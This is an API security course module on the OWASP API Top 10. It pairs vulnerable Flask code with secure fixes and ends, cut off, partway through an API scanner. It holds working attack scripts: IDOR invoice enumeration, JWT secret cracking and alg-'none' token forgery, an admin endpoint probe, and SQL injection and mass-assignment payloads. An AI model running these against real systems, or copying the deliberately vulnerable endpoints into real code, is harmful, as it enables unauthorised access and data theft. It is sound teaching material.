# 🔌 Module 13: API Security - Complete Guide with Real-World Examples

## 📚 Table of Contents
1. [Introduction to API Security](#introduction)
2. [OWASP API Security Top 10](#owasp-api-top-10)
3. [REST API Security](#rest-api-security)
4. [GraphQL Security](#graphql-security)
5. [API Authentication & Authorization](#authentication-authorization)
6. [API Penetration Testing](#api-pentesting)
7. [Real-World API Breaches](#real-world-breaches)
8. [Hands-On Labs & Exploitation](#hands-on-labs)

---

## 🎯 Introduction to API Security

### What Makes APIs Vulnerable?

```python
# Example: Vulnerable API endpoint
from flask import Flask, request, jsonify
import sqlite3

app = Flask(__name__)

# ❌ VULNERABLE: No authentication, SQL injection, no rate limiting
@app.route('/api/users/<user_id>', methods=['GET'])
def get_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # SQL Injection vulnerability
    query = f"SELECT * FROM users WHERE id = {user_id}"
    cursor.execute(query)
    
    user = cursor.fetchone()
    return jsonify(user)

# ❌ VULNERABLE: Insecure Direct Object Reference (IDOR)
@app.route('/api/account/<account_id>', methods=['GET'])
def get_account(account_id):
    # No authorization check - any user can access any account!
    conn = sqlite3.connect('accounts.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM accounts WHERE id = ?", (account_id,))
    return jsonify(cursor.fetchone())

# ❌ VULNERABLE: Mass assignment
@app.route('/api/users', methods=['POST'])
def create_user():
    data = request.get_json()
    # Accepts ANY fields from request - attacker can set is_admin=True
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute(
        "INSERT INTO users (username, email, is_admin) VALUES (?, ?, ?)",
        (data.get('username'), data.get('email'), data.get('is_admin', False))
    )
    conn.commit()
    return jsonify({"status": "created"})
```

---

## 🚨 OWASP API Security Top 10 (2023)

### API1:2023 - Broken Object Level Authorization (BOLA/IDOR)

**Vulnerability Example:**

```python
# Vulnerable endpoint
@app.route('/api/invoices/<invoice_id>', methods=['GET'])
def get_invoice(invoice_id):
    # Only checks if user is authenticated, not if they own this invoice!
    if not is_authenticated(request):
        return jsonify({"error": "Unauthorized"}), 401
    
    invoice = db.query("SELECT * FROM invoices WHERE id = ?", (invoice_id,))
    return jsonify(invoice)

# Attack: User can access ANY invoice by changing invoice_id
# GET /api/invoices/1234  (own invoice)
# GET /api/invoices/1235  (someone else's invoice - accessible!)
```

**Exploitation Script:**

```python
# idor_exploit.py - Enumerate all invoices via IDOR
import requests

target = "https://api.example.com/api/invoices/"
session = requests.Session()

# Login first
session.post("https://api.example.com/api/login", json={
    "username": "attacker",
    "password": "password123"
})

# Enumerate invoice IDs
for invoice_id in range(1000, 2000):
    response = session.get(f"{target}{invoice_id}")
    
    if response.status_code == 200:
        invoice = response.json()
        print(f"[+] Found invoice {invoice_id}:")
        print(f"    Customer: {invoice.get('customer_name')}")
        print(f"    Amount: ${invoice.get('amount')}")
        print(f"    Date: {invoice.get('date')}")
        
        # Save to file
        with open('stolen_invoices.txt', 'a') as f:
            f.write(f"{invoice_id}|{invoice}\n")
```

**Secure Implementation:**

```python
# ✅ SECURE: Check object ownership
@app.route('/api/invoices/<invoice_id>', methods=['GET'])
def get_invoice_secure(invoice_id):
    user_id = get_current_user_id(request)
    
    if not user_id:
        return jsonify({"error": "Unauthorized"}), 401
    
    # Verify user owns this invoice
    invoice = db.query(
        "SELECT * FROM invoices WHERE id = ? AND user_id = ?",
        (invoice_id, user_id)
    )
    
    if not invoice:
        return jsonify({"error": "Not found or access denied"}), 404
    
    return jsonify(invoice)

# Alternative: Use UUIDs instead of sequential IDs
import uuid

def create_invoice(user_id, amount):
    invoice_id = str(uuid.uuid4())  # e.g., "550e8400-e29b-41d4-a716-446655440000"
    db.execute(
        "INSERT INTO invoices (id, user_id, amount) VALUES (?, ?, ?)",
        (invoice_id, user_id, amount)
    )
    return invoice_id
```

---

### API2:2023 - Broken Authentication

**Vulnerability Examples:**

```python
# ❌ VULNERABLE: Weak JWT implementation
import jwt
import datetime

SECRET_KEY = "secret123"  # Weak secret

@app.route('/api/login', methods=['POST'])
def login_vulnerable():
    username = request.json.get('username')
    password = request.json.get('password')
    
    if check_credentials(username, password):
        # Create JWT token
        token = jwt.encode({
            'user_id': get_user_id(username),
            'username': username,
            'is_admin': False,
            'exp': datetime.datetime.utcnow() + datetime.timedelta(days=30)  # Too long!
        }, SECRET_KEY, algorithm='HS256')
        
        return jsonify({"token": token})
    
    return jsonify({"error": "Invalid credentials"}), 401

# Attack 1: JWT Secret Brute Force
# Attack 2: JWT Algorithm Confusion (HS256 → None)
# Attack 3: Token never expires properly
```

**JWT Attack Scripts:**

```python
# jwt_crack.py - Brute force weak JWT secrets
import jwt
import requests

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjMsInVzZXJuYW1lIjoiYXR0YWNrZXIiLCJpc19hZG1pbiI6ZmFsc2V9.xxxxx"

# Common weak secrets
wordlist = [
    'secret', 'secret123', 'password', '123456', 'admin',
    'jwt_secret', 'your-256-bit-secret', 'mysecretkey'
]

for secret in wordlist:
    try:
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"[+] SECRET FOUND: {secret}")
        print(f"[+] Decoded payload: {decoded}")
        
        # Now we can forge tokens!
        forged_token = jwt.encode({
            'user_id': 1,  # Admin user
            'username': 'admin',
            'is_admin': True  # Privilege escalation!
        }, secret, algorithm='HS256')
        
        print(f"[+] Forged admin token: {forged_token}")
        break
    except jwt.InvalidSignatureError:
        continue

# jwt_algorithm_confusion.py - Algorithm confusion attack
def algorithm_confusion_attack(token):
    """Change algorithm from HS256 to None"""
    import base64
    import json
    
    # Decode token parts
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Modify header algorithm to 'none'
    header['alg'] = 'none'
    
    # Modify payload (escalate privileges)
    payload['is_admin'] = True
    
    # Encode new token
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # No signature needed for 'none' algorithm
    forged_token = f"{new_header}.{new_payload}."
    
    return forged_token

# Test the forged token
forged = algorithm_confusion_attack(token)
response = requests.get(
    "https://api.example.com/api/admin/users",
    headers={"Authorization": f"Bearer {forged}"}
)
print(response.json())
```

**Secure Implementation:**

```python
# ✅ SECURE: Proper JWT implementation
import jwt
import datetime
import secrets
import bcrypt
from functools import wraps

# Strong secret (256-bit)
SECRET_KEY = secrets.token_hex(32)
REFRESH_SECRET = secrets.token_hex(32)

class TokenManager:
    @staticmethod
    def create_access_token(user_id, username, roles):
        """Create short-lived access token (15 minutes)"""
        payload = {
            'user_id': user_id,
            'username': username,
            'roles': roles,
            'token_type': 'access',
            'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=15),
            'iat': datetime.datetime.utcnow(),
            'jti': secrets.token_hex(16)  # Unique token ID for revocation
        }
        return jwt.encode(payload, SECRET_KEY, algorithm='HS512')  # Use HS512
    
    @staticmethod
    def create_refresh_token(user_id):
        """Create long-lived refresh token (7 days)"""
        payload = {
            'user_id': user_id,
            'token_type': 'refresh',
            'exp': datetime.datetime.utcnow() + datetime.timedelta(days=7),
            'jti': secrets.token_hex(16)
        }
        token = jwt.encode(payload, REFRESH_SECRET, algorithm='HS512')
        
        # Store refresh token in database for revocation
        db.execute(
            "INSERT INTO refresh_tokens (user_id, token, expires_at) VALUES (?, ?, ?)",
            (user_id, payload['jti'], payload['exp'])
        )
        
        return token
    
    @staticmethod
    def verify_token(token, token_type='access'):
        """Verify and decode token"""
        try:
            secret = SECRET_KEY if token_type == 'access' else REFRESH_SECRET
            payload = jwt.decode(
                token,
                secret,
                algorithms=['HS512'],  # Explicitly specify allowed algorithms
                options={'verify_exp': True}
            )
            
            # Verify token type
            if payload.get('token_type') != token_type:
                raise jwt.InvalidTokenError("Invalid token type")
            
            # Check if token is revoked (blacklist check)
            if token_type == 'refresh':
                if not db.query("SELECT 1 FROM refresh_tokens WHERE token = ?", (payload['jti'],)):
                    raise jwt.InvalidTokenError("Token revoked")
            
            return payload
        
        except jwt.ExpiredSignatureError:
            raise Exception("Token expired")
        except jwt.InvalidTokenError as e:
            raise Exception(f"Invalid token: {str(e)}")

def require_auth(f):
    """Decorator to protect endpoints"""
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({"error": "Missing authentication"}), 401
        
        token = auth_header.split(' ')[1]
        
        try:
            payload = TokenManager.verify_token(token, 'access')
            request.user = payload  # Attach user info to request
            return f(*args, **kwargs)
        except Exception as e:
            return jsonify({"error": str(e)}), 401
    
    return decorated

@app.route('/api/login', methods=['POST'])
def login_secure():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # Rate limiting (prevent brute force)
    if not check_rate_limit(username):
        return jsonify({"error": "Too many attempts"}), 429
    
    user = db.query("SELECT * FROM users WHERE username = ?", (username,))
    
    if not user or not bcrypt.checkpw(password.encode(), user['password_hash'].encode()):
        # Log failed attempt
        log_failed_login(username, request.remote_addr)
        return jsonify({"error": "Invalid credentials"}), 401
    
    # Create tokens
    access_token = TokenManager.create_access_token(
        user['id'],
        user['username'],
        user['roles']
    )
    refresh_token = TokenManager.create_refresh_token(user['id'])
    
    return jsonify({
        "access_token": access_token,
        "refresh_token": refresh_token,
        "token_type": "Bearer",
        "expires_in": 900  # 15 minutes
    })

@app.route('/api/refresh', methods=['POST'])
def refresh_token():
    """Get new access token using refresh token"""
    refresh_token = request.json.get('refresh_token')
    
    try:
        payload = TokenManager.verify_token(refresh_token, 'refresh')
        user = db.query("SELECT * FROM users WHERE id = ?", (payload['user_id'],))
        
        # Create new access token
        access_token = TokenManager.create_access_token(
            user['id'],
            user['username'],
            user['roles']
        )
        
        return jsonify({
            "access_token": access_token,
            "token_type": "Bearer",
            "expires_in": 900
        })
    
    except Exception as e:
        return jsonify({"error": str(e)}), 401

@app.route('/api/logout', methods=['POST'])
@require_auth
def logout():
    """Revoke refresh tokens"""
    user_id = request.user['user_id']
    
    # Revoke all refresh tokens for this user
    db.execute("DELETE FROM refresh_tokens WHERE user_id = ?", (user_id,))
    
    return jsonify({"status": "logged out"})

# Protected endpoint example
@app.route('/api/admin/users', methods=['GET'])
@require_auth
def admin_users():
    # Check if user has admin role
    if 'admin' not in request.user.get('roles', []):
        return jsonify({"error": "Forbidden"}), 403
    
    users = db.query("SELECT id, username, email FROM users")
    return jsonify(users)
```

---

### API3:2023 - Broken Object Property Level Authorization

**Excessive Data Exposure:**

```python
# ❌ VULNERABLE: Returns sensitive data
@app.route('/api/users/<user_id>', methods=['GET'])
def get_user_vulnerable(user_id):
    user = db.query("SELECT * FROM users WHERE id = ?", (user_id,))
    return jsonify(user)  # Returns: password_hash, ssn, salary, etc.!

# Response exposes too much:
{
    "id": 123,
    "username": "john_doe",
    "email": "john@example.com",
    "password_hash": "$2b$12$...",  # ❌ Sensitive!
    "ssn": "123-45-6789",             # ❌ Sensitive!
    "salary": 150000,                 # ❌ Sensitive!
    "api_key": "sk_live_xxx",         # ❌ Sensitive!
    "created_at": "2023-01-01"
}
```

**Mass Assignment Vulnerability:**

```python
# ❌ VULNERABLE: Accepts any field in update
@app.route('/api/users/<user_id>', methods=['PUT'])
@require_auth
def update_user_vulnerable(user_id):
    if request.user['user_id'] != int(user_id):
        return jsonify({"error": "Forbidden"}), 403
    
    data = request.get_json()
    
    # Dynamically updates ANY field user sends!
    update_fields = ', '.join([f"{k} = ?" for k in data.keys()])
    values = list(data.values()) + [user_id]
    
    db.execute(
        f"UPDATE users SET {update_fields} WHERE id = ?",
        tuple(values)
    )
    
    return jsonify({"status": "updated"})

# Attack: User can set is_admin=True, balance=1000000, etc.
# PUT /api/users/123
# {"is_admin": true, "account_balance": 1000000}
```

**Secure Implementation:**

```python
# ✅ SECURE: Use DTOs (Data Transfer Objects)
from dataclasses import dataclass
from typing import Optional

@dataclass
class UserPublicDTO:
    """Public user data - safe to expose"""
    id: int
    username: str
    email: str
    avatar_url: Optional[str]
    created_at: str

@dataclass
class UserPrivateDTO:
    """Private user data - only for owner"""
    id: int
    username: str
    email: str
    phone: Optional[str]
    avatar_url: Optional[str]
    created_at: str
    last_login: str

@dataclass
class UserUpdateDTO:
    """Allowed fields for update"""
    email: Optional[str] = None
    phone: Optional[str] = None
    avatar_url: Optional[str] = None

@app.route('/api/users/<user_id>', methods=['GET'])
@require_auth
def get_user_secure(user_id):
    user = db.query("SELECT * FROM users WHERE id = ?", (user_id,))
    
    if not user:
        return jsonify({"error": "User not found"}), 404
    
    # Return different data based on access level
    if request.user['user_id'] == int(user_id):
        # User accessing their own data - return private DTO
        dto = UserPrivateDTO(
            id=user['id'],
            username=user['username'],
            email=user['email'],
            phone=user['phone'],
            avatar_url=user['avatar_url'],
            created_at=user['created_at'],
            last_login=user['last_login']
        )
    else:
        # User accessing someone else's data - return public DTO only
        dto = UserPublicDTO(
            id=user['id'],
            username=user['username'],
            email=user['email'],
            avatar_url=user['avatar_url'],
            created_at=user['created_at']
        )
    
    return jsonify(dto.__dict__)

@app.route('/api/users/<user_id>', methods=['PUT'])
@require_auth
def update_user_secure(user_id):
    if request.user['user_id'] != int(user_id):
        return jsonify({"error": "Forbidden"}), 403
    
    data = request.get_json()
    
    # Whitelist allowed fields only
    update_dto = UserUpdateDTO(
        email=data.get('email'),
        phone=data.get('phone'),
        avatar_url=data.get('avatar_url')
    )
    
    # Validate email format
    if update_dto.email and not is_valid_email(update_dto.email):
        return jsonify({"error": "Invalid email format"}), 400
    
    # Validate phone format
    if update_dto.phone and not is_valid_phone(update_dto.phone):
        return jsonify({"error": "Invalid phone format"}), 400
    
    # Build update query only for provided fields
    update_fields = []
    values = []
    
    if update_dto.email:
        update_fields.append("email = ?")
        values.append(update_dto.email)
    
    if update_dto.phone:
        update_fields.append("phone = ?")
        values.append(update_dto.phone)
    
    if update_dto.avatar_url:
        update_fields.append("avatar_url = ?")
        values.append(update_dto.avatar_url)
    
    if update_fields:
        values.append(user_id)
        db.execute(
            f"UPDATE users SET {', '.join(update_fields)} WHERE id = ?",
            tuple(values)
        )
    
    return jsonify({"status": "updated"})
```

---

### API4:2023 - Unrestricted Resource Consumption (DoS)

**Vulnerability Examples:**

```python
# ❌ VULNERABLE: No rate limiting
@app.route('/api/search', methods=['POST'])
def search_vulnerable():
    query = request.json.get('query')
    
    # Expensive database operation with no limits
    results = db.query(
        "SELECT * FROM products WHERE name LIKE ? OR description LIKE ?",
        (f"%{query}%", f"%{query}%")
    )
    
    return jsonify(results)  # Could return millions of records!

# Attack: Send 10,000 requests per second
# Attack: Send query that returns 1 million results
```

**Secure Implementation with Rate Limiting:**

```python
# ✅ SECURE: Implement rate limiting
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import redis

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379",
    default_limits=["1000 per day", "100 per hour"]
)

@app.route('/api/search', methods=['POST'])
@limiter.limit("10 per minute")  # Max 10 requests per minute
@require_auth
def search_secure():
    query = request.json.get('query', '')
    page = request.json.get('page', 1)
    per_page = min(request.json.get('per_page', 20), 100)  # Max 100 items
    
    # Validate query length
    if len(query) > 100:
        return jsonify({"error": "Query too long"}), 400
    
    # Implement pagination
    offset = (page - 1) * per_page
    
    results = db.query(
        "SELECT * FROM products WHERE name LIKE ? OR description LIKE ? LIMIT ? OFFSET ?",
        (f"%{query}%", f"%{query}%", per_page, offset)
    )
    
    total = db.query_scalar(
        "SELECT COUNT(*) FROM products WHERE name LIKE ? OR description LIKE ?",
        (f"%{query}%", f"%{query}%")
    )
    
    return jsonify({
        "results": results,
        "page": page,
        "per_page": per_page,
        "total": total,
        "pages": (total + per_page - 1) // per_page
    })

# Advanced: Token bucket rate limiting
class TokenBucket:
    def __init__(self, capacity, refill_rate):
        self.capacity = capacity
        self.tokens = capacity
        self.refill_rate = refill_rate  # tokens per second
        self.last_refill = time.time()
    
    def consume(self, tokens=1):
        """Try to consume tokens"""
        self._refill()
        
        if self.tokens >= tokens:
            self.tokens -= tokens
            return True
        return False
    
    def _refill(self):
        """Refill tokens based on time elapsed"""
        now = time.time()
        elapsed = now - self.last_refill
        
        tokens_to_add = elapsed * self.refill_rate
        self.tokens = min(self.capacity, self.tokens + tokens_to_add)
        self.last_refill = now

# Store buckets per user/IP
rate_limiters = {}

def rate_limit_check(key, capacity=10, refill_rate=1):
    """Check rate limit using token bucket"""
    if key not in rate_limiters:
        rate_limiters[key] = TokenBucket(capacity, refill_rate)
    
    bucket = rate_limiters[key]
    
    if not bucket.consume():
        return False, 429, {"error": "Rate limit exceeded"}
    
    return True, None, None

@app.route('/api/expensive-operation', methods=['POST'])
@require_auth
def expensive_operation():
    user_id = request.user['user_id']
    
    # Custom rate limiting: 5 requests per minute
    allowed, status, response = rate_limit_check(
        f"user:{user_id}:expensive",
        capacity=5,
        refill_rate=5/60  # 5 tokens per 60 seconds
    )
    
    if not allowed:
        return jsonify(response), status
    
    # Perform operation
    result = perform_expensive_task()
    return jsonify(result)

# Implement request timeout
@app.before_request
def enforce_timeout():
    """Kill requests that take too long"""
    request.start_time = time.time()

@app.after_request
def check_timeout(response):
    elapsed = time.time() - request.start_time
    
    if elapsed > 30:  # 30 second timeout
        return jsonify({"error": "Request timeout"}), 504
    
    return response
```

---

### API5:2023 - Broken Function Level Authorization

**Vulnerability:**

```python
# ❌ VULNERABLE: No role check
@app.route('/api/admin/delete-user/<user_id>', methods=['DELETE'])
@require_auth  # Only checks if authenticated, not if admin!
def delete_user_vulnerable(user_id):
    db.execute("DELETE FROM users WHERE id = ?", (user_id,))
    return jsonify({"status": "deleted"})

# Any authenticated user can delete ANY user!
```

**Exploitation:**

```python
# admin_function_abuse.py
import requests

# Regular user credentials
session = requests.Session()
session.post("https://api.example.com/api/login", json={
    "username": "regular_user",
    "password": "password123"
})

# Access admin functions without being admin
admin_endpoints = [
    '/api/admin/users',
    '/api/admin/delete-user/1',
    '/api/admin/promote-user/2',
    '/api/admin/system-config',
    '/api/admin/logs'
]

for endpoint in admin_endpoints:
    response = session.get(f"https://api.example.com{endpoint}")
    
    if response.status_code == 200:
        print(f"[+] Vulnerable: {endpoint}")
        print(f"    Response: {response.json()}")
    else:
        print(f"[-] Protected: {endpoint}")
```

**Secure Implementation:**

```python
# ✅ SECURE: Role-based access control
from functools import wraps

def require_role(required_roles):
    """Decorator to check user roles"""
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if not hasattr(request, 'user'):
                return jsonify({"error": "Unauthorized"}), 401
            
            user_roles = request.user.get('roles', [])
            
            # Check if user has any of the required roles
            if not any(role in user_roles for role in required_roles):
                # Log unauthorized access attempt
                log_security_event(
                    event_type='unauthorized_access',
                    user_id=request.user.get('user_id'),
                    endpoint=request.path,
                    required_roles=required_roles,
                    user_roles=user_roles
                )
                
                return jsonify({"error": "Forbidden - Insufficient permissions"}), 403
            
            return f(*args, **kwargs)
        
        return decorated
    return decorator

# Admin-only endpoints
@app.route('/api/admin/users', methods=['GET'])
@require_auth
@require_role(['admin', 'super_admin'])
def admin_list_users():
    users = db.query("SELECT id, username, email, roles FROM users")
    return jsonify(users)

@app.route('/api/admin/delete-user/<user_id>', methods=['DELETE'])
@require_auth
@require_role(['super_admin'])  # Only super admins can delete
def delete_user_secure(user_id):
    # Additional check: Can't delete yourself
    if request.user['user_id'] == int(user_id):
        return jsonify({"error": "Cannot delete your own account"}), 400
    
    # Additional check: Can't delete other admins
    target_user = db.query("SELECT roles FROM users WHERE id = ?", (user_id,))
    if 'admin' in target_user['roles'] or 'super_admin' in target_user['roles']:
        return jsonify({"error": "Cannot delete admin accounts"}), 403
    
    # Log action
    log_audit_event(
        event_type='user_deleted',
        actor_id=request.user['user_id'],
        target_user_id=user_id
    )
    
    db.execute("DELETE FROM users WHERE id = ?", (user_id,))
    return jsonify({"status": "deleted"})

# Hierarchical permissions
ROLE_HIERARCHY = {
    'user': 1,
    'moderator': 2,
    'admin': 3,
    'super_admin': 4
}

def can_modify_user(actor_roles, target_roles):
    """Check if actor can modify target based on role hierarchy"""
    actor_level = max([ROLE_HIERARCHY.get(role, 0) for role in actor_roles])
    target_level = max([ROLE_HIERARCHY.get(role, 0) for role in target_roles])
    
    return actor_level > target_level

@app.route('/api/users/<user_id>/promote', methods=['POST'])
@require_auth
@require_role(['admin', 'super_admin'])
def promote_user(user_id):
    new_role = request.json.get('role')
    
    # Check if actor can assign this role
    if ROLE_HIERARCHY.get(new_role, 0) >= ROLE_HIERARCHY.get('admin', 3):
        # Only super_admin can create admins
        if 'super_admin' not in request.user.get('roles', []):
            return jsonify({"error": "Insufficient permissions"}), 403
    
    # Check if target user is lower in hierarchy
    target_user = db.query("SELECT roles FROM users WHERE id = ?", (user_id,))
    
    if not can_modify_user(request.user['roles'], target_user['roles']):
        return jsonify({"error": "Cannot modify user with equal or higher privileges"}), 403
    
    # Promote user
    db.execute("UPDATE users SET roles = ? WHERE id = ?", (new_role, user_id))
    
    return jsonify({"status": "promoted"})
```

---

## 🔍 API Penetration Testing

### Complete API Testing Methodology

```python
# api_scanner.py - Comprehensive API security scanner
import requests
import json
import re
from urllib.parse import urljoin, urlparse
import time

class APIScanner:
    def __init__(self, base_url, auth_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'API-Scanner/1.0',
            'Content-Type': 'application/json'
        })
        
        if auth_token:
            self.session.headers['Authorization'] = f'Bearer {auth_token}'
        
        self.vulnerabilities = []
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        endpoints = set()
        
        # Try common API documentation endpoints
        docs_paths = [
            '/api/docs',
            '/api-docs',
            '/swagger.json',
            '/swagger/v1/swagger.json',
            '/api/swagger.json',
            '/v1/api-docs',
            '/v2/api-docs',
            '/openapi.json',
            '/api.json'
        ]
        
        for path in docs_paths:
            url = urljoin(self.base_url, path)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[+] Found API documentation: {url}")
                    
                    # Parse Swagger/OpenAPI spec
                    spec = response.json()
                    
                    if 'paths' in spec:
                        for path, methods in spec['paths'].items():
                            for method in methods.keys():
                                endpoints.add((method.upper(), path))
            except:
                pass
        
        return endpoints
    
    def test_authentication(self):
        """Test authentication mechanisms"""
        print("\n[*] Testing Authentication...")
        
        # Test 1: Access protected endpoints without auth
        test_endpoints = [
            '/api/users/me',
            '/api/profile',
            '/api/account'
        ]
        
        for endpoint in test_endpoints:
            # Remove auth header temporarily
            original_auth = self.session.headers.pop('Authorization', None)
            
            response = self.session.get(urljoin(self.base_url, endpoint))
            
            if response.status_code == 200:
                self.vulnerabilities.append({
                    'type': 'Missing Authentication',
                    'endpoint': endpoint,
                    'severity': 'HIGH',
                    'description': 'Protected endpoint accessible without authentication'
                })
                print(f"[!] Vulnerable: {endpoint} - No auth required")
            
            # Restore auth header
            if original_auth:
                self.session.headers['Authorization'] = original_auth
        
        # Test 2: JWT vulnerabilities
        auth_header = self.session.headers.get('Authorization', '')
        if 'Bearer ' in auth_header:
            token = auth_header.split('Bearer ')[1]
            self.test_jwt_vulnerabilities(token)
    
    def test_jwt_vulnerabilities(self, token):
        """Test JWT security"""
        import base64
        
        try:
            # Decode JWT
            parts = token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            print(f"[*] JWT Header: {header}")
            print(f"[*] JWT Payload: {payload}")
            
            # Test algorithm confusion
            if header.get('alg') == 'HS256':
                print("[*] Testing algorithm confusion attack...")
                
                # Try 'none' algorithm
                modified_header = header.copy()
                modified_header['alg'] = 'none'
                
                modified_payload = payload.copy()
                modified_payload['is_admin'] = True
                
                forged_token = (
                    base64.urlsafe_b64encode(json.dumps(modified_header).encode()).decode().rstrip('=') +
                    '.' +
                    base64.urlsafe_b64encode(json.dumps(modified_payload).encode()).decode().rstrip('=') +
                    '.'
                )
                
                # Test with forged token
                test_response = self.session.get(
                    urljoin(self.base_url, '/api/users/me'),
                    headers={'Authorization': f'Bearer {forged_token}'}
                )
                
                if test_response.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'JWT Algorithm Confusion',
                        'severity': 'CRITICAL',
                        'description': 'JWT accepts "none" algorithm - complete authentication bypass'
                    })
                    print("[!] CRITICAL: JWT algorithm confusion vulnerability found!")
            
            # Check for sensitive data in JWT
            sensitive_fields = ['password', 'secret', 'api_key', 'ssn', 'credit_card']
            for field in sensitive_fields:
                if field in payload:
                    self.vulnerabilities.append({
                        'type': 'Sensitive Data in JWT',
                        'field': field,
                        'severity': 'MEDIUM',
                        'description': f'JWT contains sensitive field: {field}'
                    })
        
        except Exception as e:
            print(f"[-] JWT decode error: {e}")
    
    def test_idor(self):
        """Test for IDOR vulnerabilities"""
        print("\n[*] Testing for IDOR vulnerabilities...")
        
        # Test numeric ID endpoints
        id_endpoints = [
            '/api/users/{id}',
            '/api/invoices/{id}',
            '/api/orders/{id}',
            '/api/documents/{id}'
        ]
        
        for endpoint_template in id_endpoints:
            # Try accessing IDs 1-10
            for test_id in range(1, 11):
                endpoint = endpoint_template.replace('{id}', str(test_id))
                response = self.session.get(urljoin(self.base_url, endpoint))
                
                if response.status_code == 200:
                    print(f"[+] Accessible: {endpoint}")
                    
                    # Check if different users' data is accessible
                    # (requires multiple test accounts)
        
        print("[*] IDOR testing complete. Review accessible endpoints.")
    
    def test_sql_injection(self, endpoints):
        """Test for SQL injection"""
        print("\n[*] Testing for SQL Injection...")
        
        sqli_payloads = [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "admin'--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' AND 1=2--"
        ]
        
        for method, path in endpoints:
            for payload in sqli_payloads:
                # Test query parameters
                if '?' not in path:
                    test_url = f"{path}?id={payload}"
                else:
                    test_url = f"{path}&test={payload}"
                
                try:
                    response = self.session.request(
                        method,
                        urljoin(self.base_url, test_url),
                        timeout=5
                    )
                    
                    # Check for SQL error messages
                    error_patterns = [
                        r'SQL syntax',
                        r'mysql_fetch',
                        r'ORA-\d+',
                        r'PostgreSQL.*ERROR',
                        r'SQLite3::',
                        r'SQLSTATE\[\d+\]'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            self.vulnerabilities.append({
                                'type': 'SQL Injection',
                                'endpoint': path,
                                'method': method,
                                'payload': payload,
                                'severity': 'CRITICAL',
                                'description': 'SQL error message exposed'
                            })
                            print(f"[!] SQL Injection found: {method} {path}")
                            break
                
                except:
                    pass
    
    def test_rate_limiting(self):
        """Test rate limiting"""
        print("\n[*] Testing rate limiting...")
        
        test_endpoint = '/api/users'
        
        start_time = time.time()
        request_count = 0
        
        # Send 100 requests
        for i in range(100):
            response = self.session.get(urljoin(self.base_url, test_endpoint))
            request_count += 1
            
            if response.status_code == 429:
                elapsed = time.time() - start_time
                print(f"[+] Rate limiting active: {request_count} requests in {elapsed:.2f}s before block")
                return
        
        elapsed = time.time() - start_time
        print(f"[!] No rate limiting: {request_count} requests in {elapsed:.2f}s")
        
        self.vulnerabilities.append({
            'type': 'Missing Rate Limiting',
            'severity': 'MEDIUM',
            'description': 'API does not implement rate limiting - DoS possible'
        })
    
    def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        print("\n[*] Testing for mass assignment...")
        
        # Try updating user profile with admin fields
        malicious_payloads = [
            {'is_admin': True},
            {'role': 'admin'},
            {'roles': ['admin']},
            {'account_balance': 1000000},
            {'permissions': ['*']}
        ]
        
        update_endpoints = [
            '/api/users/me',
            '/api/profile',
            '/api/account'
        ]
        
        for endpoint in update_endpoints:
            for payload in malicious_payloads:
                response = self.session.put(
                    urljoin(self.base_url, endpoint),
                    json=payload
                )
                
                if response.status_code in [200, 201]:
                    # Verify if malicious field was accepted
                    verify_response = self.session.get(urljoin(self.base_url, endpoint))
                    
                    if verify_response.status_code == 200:
                        result = verify_response.json()
                        
                        for key in payload.keys():
                            if key in result and result[key] == payload[key]:
                                self.vulnerabilities.append({
                                    'type': 'Mass Assignment',
                                    'endpoint': endpoint,
                                    'field': key,
                                    'severity': 'HIGH',
                                    'description': f'Privileged field "{key}" can be modified'
                                })
                                print(f"[!] Mass assignment: {endpoint} - {key}")
    
    def generate_report(self):
        """Generate vulnerability report"""
        print("\n" + "="*60)
        print("API SECURITY SCAN REPORT")
        print("="*60)
        
        if not self.vulnerabilities:
            print("\n✅ No vulnerabilities found!")
            return
        
        # Group by severity
        critical = [v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']
        high = [v for v in self.vulnerabilities if v['severity'] == 'HIGH']
        medium = [v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']
        low = [v for v in self.vulnerabilities if v['severity'] == 'LOW']
        
        print(f"\n🔴 Critical: {len(critical)}")
        print(f"🟠 High: {len(high)}")
        print(f"🟡 Medium: {len(medium)}")
        print(f"🟢 Low: {len(low)}")
        
        print("\n" + "-"*60)
        print("VULNERABILITIES")
        print("-"*60)
        
        for vuln in self.vulnerabilities:
            print(f"\n[{vuln['severity']}] {vuln['type']}")
            print(f"Description: {vuln['description']}")
            
            if 'endpoint' in vuln:
                print(f"Endpoint: {vuln['endpoint']}")
            
            if 'method' in vuln:
                print(f"Method: {vuln['method']}")
            
            if 'payload' in vuln:
                print(f"Payload: {vuln['payload']}")
    
    def scan(self):
        """Run complete security scan"""
        print(f"[*] Starting API security scan: {self.base_url}")
        
        # 1. Discover endpoints
